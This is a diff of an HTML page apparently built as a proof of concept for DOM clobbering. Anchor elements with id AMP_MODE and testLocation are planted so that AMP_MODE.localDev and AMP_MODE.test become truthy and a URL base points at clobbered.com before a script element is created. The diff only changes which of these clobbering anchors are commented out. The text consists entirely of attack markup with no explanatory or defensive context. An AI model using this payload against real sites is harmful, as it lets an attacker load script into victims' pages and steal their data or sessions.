@@ -5,17 +5,17 @@
     <title>Submit Name to Anchor</title>
 </head>
 <body>
-<!--     /////clobbering payload/////
+    /////clobbering payload/////
     <!-- We need to make AMP_MODE.localDev and AMP_MODE.test truthy-->
-    <a id="AMP_MODE"></a>
+<!--     <a id="AMP_MODE"></a>
     <a id="AMP_MODE" name="localDev"></a>
-    <a id="AMP_MODE" name="test"></a>
+    <a id="AMP_MODE" name="test"></a> -->
      
 <!--     window.testLocation.protocol is a base for the URL -->
-    <a id="testLocation"></a>
+<!--     <a id="testLocation"></a>
     <a id="testLocation" name="protocol" 
-       href="https://clobbered.com#"></a>
-    /////////////////////////// -->
+       href="https://clobbered.com#"></a> -->
+    ///////////////////////////
     <script>
         AMP_MODE = window.AMP_MODE || {};
         var script = window.document.createElement("script");
